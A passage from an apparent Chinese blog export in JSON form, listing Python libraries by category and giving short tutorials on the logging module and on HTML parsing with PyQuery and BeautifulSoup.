PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。\n\n数据库\n\n库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。\n\npickledb,简单和轻量级的K-V键值存储。\n\nTinyDB, 轻量级，面向文档的数据库。\n\nmysql-python，MySQL的Python工具库。\n\nmysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。\n\nmysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。\n\noursql，MySQL连接器，提供本地话指令语句和BLOBs支持。\n\npsycopg2，最流行的Python PostgreSQL适配器。\n\ntxpostgres，于Twisted的异步驱动，用于PostgreSQL。\n\nqueries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。\n\ncassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。\n\nHappyBase，友好的Apache [Hbase]的函数库。\n\nPyMongo，MongoDB官方客户端。\n\nPlyvel，LevelDB快速和功能丰富的Python接口。\n\nredis-py,redis客户端。\n\npy2neo,Python客户端(基于Neo4j的RESTful接口).\n\ntelephus,基于Twisted的cassandra客户端。\n\ntxRedis，基于Twisted的Redis客户端。\n\n在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！\n\n【网络】\n\nCurl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。\n\nRequests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。\n\nhttpie，命令行HTTP客户端，用户友好的cURL的替换工具。\n\ns3cmd，命令行工具，用于管理Amazon S3和CloudFront。\n\nyoutube-dl，命令行程序，从YouTube下载视频。\n\nyou-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。\n\nsubliminal，命令行工具，搜索和下载字幕的函数库。\n\nrequests，HTTP函数库，更加人性化。\n\ngrequests，异步HTTP请求+ Gevent（高性能高并发函数库）。\n\nurllib3，一个线程安全的HTTP连接池，支持文件post。\n\nhttplib2，综合HTTP的客户端函数库。\n\ntreq， Python API接口，Twisted的HTTP客户。\n\nMininet，流行的网络仿真器,API采用python编写。\n\nPOX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。\n\nPyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。\n\nSDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。\n\ninbox.py，Python的SMTP服务器。\n\nimbox， Python版本IMAP库。\n\ninbox，收件箱，开源邮件工具包。\n\nlamson,SMTP服务器。\n\nflanker,侧卫,电子邮件地址和MIME解析库。\n\nmarrow.mailer,高性能可扩展邮件交付框架。\n\ndjango-celery-ses， Django电子邮件后台，使用AWS SES和Celery。\n\nmodoboa，邮件托管和管理平台，包括现代和简化Web UI。\n\nenvelopes，邮件工具。\n\nmailjet，批量邮寄mailjet API接口，带统计。\n\nTalon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。\n\nfurl，燃料，小型的的URL解析库库。\n\npurl，简单的，干净的API，操纵URL。\n\npyshorteners，纯Python库，URL短网址编辑。\n\nshort_url，短网址生成。\n\nScrapy，快速屏幕截取和网页抓取的框架。\n\nportia，波西亚，Scrapy的可视化扩展。\n\nfeedparser，信息源解释器\n\nRoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。\n\nMechanicalSoup，网站自动化互动测试工具包。\n\nmechanize，网页浏览编程工具。\n\nDemiurge，造物主，-PyQuery的轻量级工具。\n\nnewspaper,提取报纸新闻。\n\nhtml2text,转换HTML为 Markdown格式的文本。\n\npython-goose,HTML内容提取器。\n\nlassie,莱西,人性化的网站内容检索。\n\nmicawber,通过UR抓提网页的函数库。\n\nsumy，概要，文本和HTML网页的自动文摘模块。\n\nHaul，距离，可扩展的图像爬虫。\n\npython-readability,可读性工具Arc90,快速的Python接口。\n\nopengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。\n\nsanitize，消毒，使混乱的数据变的理智。\n\nAutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。\n\nSimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。\n\nzeroRPC，基于ZeroMQ和MessagePack的RPC实现。\n\napache-libcloud，所有云服务的Python接口库。\n\nwifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。\n\nstreamparse，运行Python代码和数据的实时流。集成了Apache Storm。\n\nboto，亚马逊网络服务接口。\n\ntwython，Twitter推特API。\n\ngoogle-api-python-client，谷歌客户端API。\n\ngspread，谷歌电子表格的Python API。\n\nfacebook-sdk，facebook平台Python SDK。\n\nfacepy，简易的facebook图形APIgmail，Gmail的Python接口。\n\ndjango-wordpress，Django的WordPress的模型和视图。\n\nWeb框架\n\nDjango，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库\n\nPyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。\n\nPylons 基于Python的一个极其高效和可靠的Web开发框架\n\nZope 开源的Web应用服务器\n\nTurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。\n\nQuixoteWeb开发框架Flask,轻量级web框架。\n\nBottle，快速，简单和轻量级的WSGI模式Web框架。\n\nPyramid，轻量级，快速，稳定的开源Web框架。\n\nweb2py，简单易用的全堆栈Web框架和平台。\n\nweb.py，强大、简单的Web框架。\n\nTurboGears，便于扩展的Web框架。\n\nCherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。\n\nGrok，基于Zope3的Web框架。\n\nBluebream，开源的Web应用服务器，原名Zope 3。\n\nguava，轻量级，高性能的Python-Web框架，采用c语言编写。\n\ndjango-cms，基于Django企业级开源CMS。\n\ndjedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。\n\nFeinCMS，基于Django的先进内容管理系统。\n\nKotte，高层次的Python的Web应用框架，基于Pyramid。\n\nMezzanine，强大，一致，灵活的内容管理平台。\n\nOpps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。\n\nPlone，基于Zope的开源应用服务器Zope。\n\nQuokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。\n\nWagtail，Django内容管理系统。\n\nWidgy，CMS框架，基于Django。\n\ndjango-oscar，Django奥斯卡，开源的电子商务框架。\n\ndjango-shop，基于Django的网店系统。\n\nmerchant，支持多种付款处理工具。\n\nmoney，可扩展的货币兑换解决方案。\n\npython-currencies，货币显示格式。\n\ncornice，Pyramid的REST框架。\n\ndjango-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。\n\ndjango-tastypie，创造精美的Django应用程序API接口。\n\ndjango-formapi，创建JSON API、HMAC认证和Django表单验证。\n\nflask-api，提供统一的浏览器体验，基于Django框架。\n\nflask-restful，快速构建REST API支持扩展。\n\nflask-api-utils，flask的扩展。\n\nfalcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。\n\neve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。\n\nsandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。\n\nrestless，类似TastyPie的框架。\n\nsavory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。\n\nGenshi，网络感知输出模板工具包。\n\nMako，马可，Python平台的超高速、轻型模板。\n\nChameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。\n\nSpitfire，快速的Python编译模板。\n\ndjango-haystack,大海捞针,Django模块搜索。\n\nelasticsearch-py,Elasticsearch官方低级的Python客户端。\n\nsolrpy,solr客户端。\n\nWhoosh,呼,快速，纯Python搜索引擎库。\n\nFeedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。\n\ndjango-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。\n\nBeaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。\n\ndogpile.cache，是Beaker作者的下一代替代作品。\n\nHermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。\n\ndjango-cache-machine，Django缓存机，自动缓存失效，使用ORM。\n\ndjango-cacheops，自动颗粒事件驱动，ORM缓存失效。\n\njohnny-cache,约翰尼高速缓存框架,Django应用程序。\n\ndjango-viewlet,渲染模板部件扩展缓存控制。\n\npylibmc,在libmemcached接口。\n\nWTForms-JSON,JSON表单数据处理扩展。\n\nDeform， HTML表单生成的函数库。\n\ndjango-bootstrap3，bootstrap3，集成了Django。\n\ndjango-crispy-forms，Django程序，可以创建优雅的表单。\n\ndjango-remote-forms，Django的远程表单，Django表格的序列化程序。\n\ndjango-simple-spam-blocker，Django简单的垃圾邮件拦截器。\n\ndjango-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。\n\nGrappelli，界面花哨的django皮肤。\n\ndjango-suit，Django替代o界面（仅用于非商业用途）。\n\ndjango-xadmin，Django管理面板替代工具。\n\nflask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。\n\nPelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。\n\nCactus,仙人掌,设计师的网站静态生成器。\n\nHyde，海德， 基于Jinja2的静态网站生成器。\n\nNikola，尼古拉-一个静态网站和博客生成器。\n\nTags，标签，最简单的静态网站生成器。\n\nTinkerer，工匠，基于Sphinx的静态网站生成器。\n\nasyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。\n\ngevent，基于Python的网络库。\n\nTwisted，扭曲，事件驱动的网络引擎。\n\nTornado，龙卷风，Web框架和异步网络的函数库。\n\npulsar，脉冲星，事件驱动的并行框架的Python。\n\ndiesel，柴油，绿色的，基于事件的I/O框架。\n\neventlet，WSGI支持异步框架。\n\npyzmq， 0MQ消息库的Python封装。\n\ntxZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。\n\nwsgiref，Python标准库，WSGI封装实现，单线程。\n\nWerkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。\n\npaste，粘贴，多线程，稳定的，久经考验的WSGI工具。\n\nrocket，火箭，多线程服务，基于Pyramid。\n\nnetius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。\n\nfapws3，异步网络，用C写的。\n\nmeinheld，异步WSGI服务器，是用C写的。\n\nbjoern，-快速的、异步WSGI服务器，用C写的。\n\n安全\n\nPermissions函数库，允许或拒绝用户访问数据或函数。\n\ndjango-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。\n\nAuthomatic，简单强大的认证/授权客户端。\n\nOAuthLib， 通用，规范，OAuth请求签约工具。\n\nrauth，用于OAuth 1.0，2.0，的Python库。\n\npython-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。\n\npython-social-auth，易于安装的社会认证机制。\n\ndjango-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。\n\ndjango-allauth，Django认证的应用程序。\n\nFlask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。\n\njose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。\n\npython-jwt，JSON的Web令牌生成和验证模块。\n\npyjwt，JSON的Web令牌草案01。\n\npython-jws，JSON的Web令牌草案02。\n\nPyCrypto，Python的加密工具包。\n\nParamiko，sshv2协议的实现，提供了客户端和服务器端的功能。\n\ncryptography，密码开发工具包。\n\nPyNac，网络和密码（NaCl）函数库。\n\nhashids，hashids的 Python函数库。\n\nPasslib，安全的密码存储/哈希库，非常高的水平。\n\nhashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。\n\n它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512.\n\nGUI库\n\n名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。\n\nwxPython，混合wxWidgets的C++类库。\n\nkivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。\n\ncurse，用于创建终端GUI应用程序。\n\nurwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。\n\npyglet，跨平台的窗口和多媒体库的Python。\n\nTkinter，是Python事实上的标准GUI软件包。\n\nenaml，创建漂亮的用户界面，语法类似QML。\n\nToga，托加，OS原生GUI工具包。【构建封装】\n\npyenv,简单的Python版本管理。\n\nvirtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。\n\nvirtualenvwrapper，是virtualenv的一组扩展。\n\npew,一套管理多个虚拟环境的工具。\n\nvex，使运行指定的virtualenv命令。\n\nPyRun，一个单文件，无需安装的Python版本管理工具。\n\nPIP，Python包和依赖的管理工具。\n\neasy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。\n\nconda，跨平台，二进制软件包管理器。\n\nCurdling，一个管理Python包的命令行工具。\n\nwheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库\n\npy2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。\n\npyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。\n\npynsist,构建Windows安装程序的工具，用Python编写。\n\ndh-virtualenv,建立和分发virtualenv(Debian软件包格式)\n\nPyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。\n\ndevpi，PyPI服务器和包装/测试/发布工具。\n\nlocalshop，PyPI官方包镜像服务器，支持本地（私人）包上传。\n\nbuildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。\n\nSCons，软件构造工具。\n\nplatformio，一个控制台的工具，构建的代码可用于不同的开发平台。\n\nbitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包\n\nfabricate，自动为任何编程语言，生成依赖包。\n\ndjango-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。\n\njinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。\n\nwebassets，优化管理，静态资源，独特的缓存清除。\n\nfanstatic，球迷，包优化，提供静态文件。\n\nfileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。\n\ndjango-storages，一组自定义存储Django后台。\n\nglue，胶胶，一个简单的命令行工具，生成CSS Sprites。\n\nlibsass-python，Sass (层叠样式表)的Python接口。\n\nFlask-Assets，整合应用程序资源。【代码调试】\n\nunittest，Python标准库，单元测试框架。\n\nnose，鼻子，unittest延伸产品。\n\npytest，成熟的全功能的Python测试工具。\n\nmamba，曼巴，Python的权威测试工具，出自BDD的旗下。\n\ncontexts，背景，BDD测试框架，基于C#。\n\npyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。\n\nsplinter，分裂，测试Web应用程序的开源工具。\n\nlocust，刺槐，可扩展的用户负载测试工具，用Python写的。\n\nsixpack，语言无关的A/B测试框架。\n\nmock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。\n\nresponses，工具函数，用于mock模拟测试。\n\ndoublex-强大的测试框架。\n\nfreezegun，通过时间调整，测试模块。\n\nhttpretty， HTTP请求的模拟工具。\n\nhttmock，mock模拟测试。\n\ncoverage，代码覆盖度量测试。\n\nfaker，生成模拟测试数据的Python包。\n\nmixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。\n\nForgeryPy，易用的模拟数据发生器。\n\nradar，雷达，生成随机日期/时间。\n\nFuckIt.py，测试Python代码运行。\n\nCode Analysispysonar2，Python类型索引。\n\npycallgraph,可视化的流量（调用图）应用程序。\n\ncode2flow,转换Python和JavaScript代码到流程图。\n\nLinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。\n\nPylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。\n\nPyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。\n\npdb,Python标准库,Python调试器。\n\nipdb,IPython使用的PDB。\n\nwinpdb，独立于平台的GUI调试器。\n\npudb，全屏，基于python调试控制台。\n\npyringe，-可附着于及注入代码到Python程序的调试器。\n\npython-statsd，statsd服务器客户端。\n\nmemory_profiler， 内存监视。\n\nprofiling，交互式Python分析器。\n\ndjango-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。\n\nflask-debugtoolbar,flask调试工具。\n\n（完）\n\n\n\n\n\n","tags":["Python"],"categories":["Python"]},{"title":"python-logging模块","url":"%2Fposts%2Fdc0c5108%2F","content":"\n\n\n\n\n###### 为什么会用logging模块\n\n- 灵活性好，方便配置\n- 输出或保存不同级别日志\n\n###### logging模块结构\n\nlogging 在源码中有三个文件,结构如下:\n\n```\n├── config.py\n├── handlers.py\n└── __init__.py\n```\n\n- `__int__.py`中实现了基础功能,主要的逻辑就在这个文件中\n- `handlers.py`是一些Handlers用起来很方便的.\n- `config.py `是对配置做处理的方法.\n\n\n\n\n###### 基础\n\n```python\nimport logging\n\n\n# 1.初始化   相当于\nlogger = logging.getLogger(\"test_name\")\n\n\n# 2.设置级别\nlogger.setLevel(logging.DEBUG)  # 低于这个级别就不去管他\n\n\n# 3. 定义handler:\n# 在控制台输出  FileHandler\nsh = logging.StreamHandler()   # 定义控制台输出 \nsh.setLevel(logging.ERROR)   # 设置最低级别 达到什么级别的时候管 低于..不执行  \n\n# 写在文件里面 SteamHandler\nfh = logging.FileHandler(r'file_test.log')\nfh.setLevel(logging.DEBUG)  # 达到什么级别就写到文件里面去\n\n\n# 4. 格式化输出   formatter     注意之间逗号不需要加，只是为了美观\nformatter = logging.Formatter(\n   '时间：%(asctime)s,'\n   '日志级别:%(levelname)s,'\n   '日志信息：%(message)s,'\n   )\nsh.setFormatter(formatter)  # 设置控制台的样式\nfh.setFormatter(formatter)  # 设置文件的样式\n\n\n# 添加进去\nlogger.addHandler(sh)\nlogger.addHandler(fh)\n\n\n\n\nif __name__ == '__main__':\n   logger.debug('测试中')\n   logger.info('正常运行')\n   logger.warn('警告')\n   logger.error('完了error')\n   logger.critical('炸了')\n\n   # 例如：\n   def func(a):\n      try:\n         num = 40/a\n         logger.info(num)   # 正常的话记录\n      except Exception as e:\n         logger.error(e)   # 将错误记录\n      \n   func(0)\n\n\n\n\n##  logging 中的级别\n\"\"\"\nDEBUG：调试信息，通常在诊断问题的时候用得着；\nINFO：普通信息，确认程序安装预期运行；\nWARNING：警告信息，表示发生了意想不到的事情，或者指示接下来可能会出现一些问题，但是程序还是继续运行；\nERROR：错误信息，程序运行中出现了一些问题，一些功能没有执行；\nCRITICAL：危险信息，一个严重的错误，导致程序无法继续运行。\n\n# 对应下面5个方法\ndebug\ninfo\nWarning\nerror  \ncritical \n\"\"\"\n\n\n```\n\n\n\n###### logging常用的格式化:\n\n<img src=\"http://image.xpshuai.cn/logging%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96.jpg\"></img>\n\n\n\n\n\n\n\n\n\n\n\n","tags":["logging"],"categories":["Python"]},{"title":"python-PyQuery","url":"%2Fposts%2F3176db18%2F","content":"\n\n  \n**Python爬虫解析库，主流的有**\n\n- PyQuery\n- Beautifulsoup\n- Scrapy Selectors\n- 正则表达式。\n\nPyQuery和scrapy Selectors都是基于lxml模块，而lxml和正则表达式都是C语言写的，只有Beautifulsoup是用纯Python编写的，所以在实测中，`Beautifulsoup` 的解析速度比其他几种`慢了5倍以上`！\n\n`正则表达式`的构造稍微`复杂`一点，一般在结构化的网页中没必要用正则（易出错）;\n\nScrapy Selectors支持css，xpath以及正则表达式 ;\n\n`PyQuery`只支持css（css语法更精简一些），` 类似于jQuery`\n\nScrapy Selector中的css语法和PyQuery中的略有不同，本文以PyQuery为例（不用Scrapy框架的话，PyQuery就够用了）\n\n\n\n----\n\n\n  \n### 安装\n\n```bash\npip3 install pyquery\n```\n\n\n\n### 使用\n\n###### 初始化\n\n```python\nimport requests\nfrom pyquery import PyQuery as pq\n\n\nurl = 'https://www.guokr.com/'\nr = requests.get(url)\n\n# 实例化\ndoc = pq(r.text)\n\n```\n\n\n\n###### 获取元素\n\n跟jQuery是一样的，也就不细说了，简单举几个小例子\n\n```python\n# 1.获取class是content-title的元素\n# class是点.        id是#\nprint(doc('h2.content-title'))      # 获取果壳网\n\n# 2.获取标签的文本内容\nprint(doc('h2.content-title').text())\n\n# 3.遍历（先items()）\nlis = doc('h2.content-title').items()\nfor li in lis:\n    print(li.text())\n\n\n# 4. 获取class为content的div标签下面的ul下面的li\n# 用空格表示子孙节点\nlis = doc('div.content ul li').items()\n#lis = doc('div.content li').items()\nfor i in lis:\n    print(i.text())\n    \n    \n# 5. 如果类名不唯一，还可以加上其他的类名一起定位\nprint(doc('div.cont.a.b.c.d'))\n# 标签里的空格表示`并列`，表示这个div标签有cont,a,b,c,d这五个类名，但在css语法里空格表示`嵌套`，所以我们要添加其他类名的时候`不能输入空格`，而是直接用`小数点`来添加其他类名\n    \n    \n    \n# 6. 获取属性         attr(\"属性名\")\nlis = doc('div.content li').items()\nfor i in lis:\n    print(i.text(),i('a').attr('href'))\n\n    \n    \n# 7. 其他的一些选择器\nlis = doc('div.content ul li')\n#父节点,包含父节点的所有子孙节点的内容\n#相当于\n#print(doc('div.content ul'))\nprint(lis.parent())\n#祖先节点,就相当于所有源代码了\nprint(lis.parents())\n#兄弟节点,即同级节点，不包含自己\nprint(lis.siblings)\n\n```\n\n\n\n#### 其他技巧\n\n1.伪类选择器\n\n```python\n#第二个标签\nlis = doc('div.content li:nth-child(2)').items()\nfor i in lis:\n    print(i.text(),i('a').attr('href'))\n    \n# 第一个a标签的语法是 a:first-child,最后一个是a:last-child,其它位置的语法如上图所示，第几个括号里就是几（当然第一个你也可以写成 li:nth-child(1))\n\n```\n\n类似的\n\n```python\n#div.content 下面第二个（含）之后的li标签\nlis = doc('div.content li:gt(1)').items()\nfor i in lis:\n    print(i.text(),i('a').attr('href'))\n    \n# gt就是greater than,大于的意思，lt (less than)是小于\n```\n\n筛选文本\n\n```python\nlis = doc('div.content ul').items()\nfor i in lis:\n    #文本包含问号的li标签\n    print(i(\"li:contains('？')\").text())\n```\n\n\n\n\n\n\n\n\n\n2.修改标签属性\n\n```python\n#用remove把特定标签移除，然后再进行遍历\nlis = doc('div.content ul').remove('.content-article').items()\nfor i in lis:\n    print(i.text())\n    \n    \n# 还有如修改属性，增加css之类的一些使用率较低的，用到的时候去官方文档查\n```\n\n\n\n###### \n\n###### 直接在Chrome里调试\n\n\n\n```python\n\nChrome浏览器自带css的查询方法，按f12或者右键检查，打开Elements面板，按ctrl+f，\n\n这里支持xpath，css语法，以及普通的字符查找\n\n要注意的是右边的数字，显示的是满足条件的标签数量，可以按向下的箭头过一遍，看看是不是自己想要的信息。\n\n```\n\n\n\n京东的商品栏目\n\n```python\nimport requests\nfrom pyquery import PyQuery as pq\n\n\nurl = 'https://www.jd.com/'\nr = requests.get(url)\n\n# 实例化\ndoc = pq(r.text)\n\nflag = 1\n# for i in doc(\"li.cate_menu_item:nth-child(3) a\").items():\nfor i in doc(\"li.cate_menu_item:gt(1) a\").items():\n    # print(i.text())\n    print(i.attr('href'))\n    print(i.text())\n    flag = flag + 1\n    print(\"------------\")\n\nprint(flag)\n\n```\n\n\n\n\n\n\n\n\n\n\n\n> 参考文章：https://www.jianshu.com/p/7eb136bbe317\n\n> 更多用法：https://pythonhosted.org/pyquery/\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["PyQuery"],"categories":["Python"]},{"title":"python-Beautifulsoup","url":"%2Fposts%2Fa2109bc%2F","content":"\n\n  \nBeautifulsoup也是用来解析网页数据的\n  \n#### BeautifulSoup`对象四种类型`:\n  \n- tag\n- NavigableString\n- BeautifulSoap\n- Comment\n\n\n  \n## 初始化\n\n###### 安装\n\n```shell\npip3 install beautifulsoup4\n\n```\n\n\n\n###### 导入\n\n```python\nfrom bs4 import BeautifulSoup\n```\n\n\n\n\n\n## 使用\n\n```python\nfrom bs4 import BeautifulSoup\n\nsoup = BeautifulSoup(html_doc, 'html.parser')\n\nprint(soup.title)\n```\n\n\n\n\n\n\n\n\n\n#### 查找\n\n###### 基本\n\n```python\nsoup = BeautifulSoup(open(\"index.html\"))  #文件句柄\nsoup = BeautifulSoup(\"<html>data</html>\")  #字符串\n\n```\n\n\n\n###### find 和 find_all\n\n搜索当前 tag 的所有 tag 子节点，并判断是否符合过滤器的条件\n\n**语法：**\n\n```python\nfind(name=None, attrs={}, recursive=True, text=None, **kwargs) \n\nfind_all(name=None, attrs={}, recursive=True, text=None, limit=None, **kwargs)\n\n```\n\n\n\n通过 attrs 参数传递： \n\n```python\ndata_soup = BeautifulSoup('<div data-foo=\"value\">foo!</div>') \n\nprint(data_soup.find_all(attrs={\"data-foo\": \"value\"}))\n```\n\n\n\n按 class_ 查找:\n\n```bash\ncss_soup = BeautifulSoup('<p class=\"body bold strikeout\"></p>') \n\nprint(css_soup.find_all(\"p\", class_=\"strikeout\")) \nprint(css_soup.find_all(\"p\", class_=\"body\"))\n```\n\n\n\n其他搜索方法：\n\n```python\nfind_parents()　　　　　 # 返回所有祖先节点\n\nfind_parent()　　　　　　# 返回直接父节点\n\nfind_next_siblings()　　 # 返回后面所有的兄弟节点\n\nfind_next_sibling()　　 # 返回后面的第一个兄弟节点\n\nfind_previous_siblings() # 返回前面所有的兄弟节点\n\nfind_previous_sibling() #　返回前面第一个兄弟节点\n\nfind_all_next()　　　　 # 返回节点后所有符合条件的节点\n\nfind_next()　　　　　　# 返回节点后第一个符合条件的节点\n\nfind_all_previous()　　 # 返回节点前所有符合条件的节点\n\nfind_previous()　　　　 # 返回节点前所有符合条件的节点\n```\n\n\n\n \n\n从文档中找到所有a标签的链接:\n\n```python\nfor link in soup.find_all('a'):\n    print(link.get('href'))\n```\n\n\n\n从文档中获取所有文字内容:\n\n```python\nprint(soup.get_text())\n\n```\n\n\n\n#### 对象\n\n###### Tag\n\n`Tag`对象与XML或HTML原生文档中的tag相同\n\ntag中最重要的属性: `name`和`attributes`\n\n- name\n\n  ```python\n  tag.name\n  \n  # 复赋值\n  tag.name = \"xxx\"\n  ```\n\n- attributes\n\n  一个tag可能有很多个属性，一个属性可能有很多个值。\n\n  ```python\n  # 获取tag的指定属性的属性值\n  tag['class']\n  \n  # 获取tag的全部属性及属性值:\n  tag.attrs\n  \n  # tag属性及属性值添加\n  tag['class'] = 'row'\n  \n  # 属性值的删除\n  del tag['class']\n  \n  # 查看属性值\n  print(tag.get('class'))\n  \n  \n  ```\n\n  多值属性tag：   返回类型一般是list,但当某个属性在任何版本的HTML定义中都没有被定义为多值属性时，会将这个属性作为字符串返回\n\n  ```python\n  css_soup = BeautifulSoup('<p class=\"body row\"></p>')\n  css_soup.p['class']\n  # [\"body\", \"row\"]\n  \n  css_soup = BeautifulSoup('<p class=\"body\"></p>')\n  css_soup.p['class']\n  # [\"body\"]\n  \n  id_soup = BeautifulSoup('<p id=\"my id\"></p>')\n  id_soup.p['id']\n  # 'my id'\n  \n  \n  ```\n\n  > 如果转换的文档是XML格式,那么tag中不包含多值属性\n\n  获取tag某个子节点:   `soup.tag名`， `soup.a`\n\n  获取tag全部子节点:  `.contents` 和 `.children`\n\n  获取tag全部子节点及子孙节点：``.descendants``\n\n  ```python\n  for child in head_tag.descendants:\n      print(child)\n  \n  ```\n\n  节点内的字符串:     \n\n  ```python\n  # .string\n  head_tag.string\n  \n  # .strings     如果tag中包含多个字符串`.strings` 来循环获取\n  head_tag.strings\n  for string in soup.strings:\n      print(repr(string))\n      \n  # .stripped_strings  去除空行空白\n  for string in soup.stripped_strings:\n      print(repr(string))\n      \n  ```\n\n  父亲节点：`.parent`\n\n  所有父辈节点：`.parents`\n\n  兄弟节点: `.prettify()`, 其中`next_sibling`和`previous_sibling`是前后兄弟\n\n  **回退和前进：**  通过 `.next_elements` 和 `.previous_elements` 的迭代器就可以向前或向后访问文档的解析内容,就好像文档正在被解析一样\n\n  \n\n\n\n###### find_all\n\n```python\n# 过滤str\nsoup.find_all('b')\n\n\n# 过滤正则\nfor tag in soup.find_all(re.compile(\"^b\")):\n   print(tag.name)\n\n# 过滤多个\nsoup.find_all([\"a\", \"b\"])\n\n# 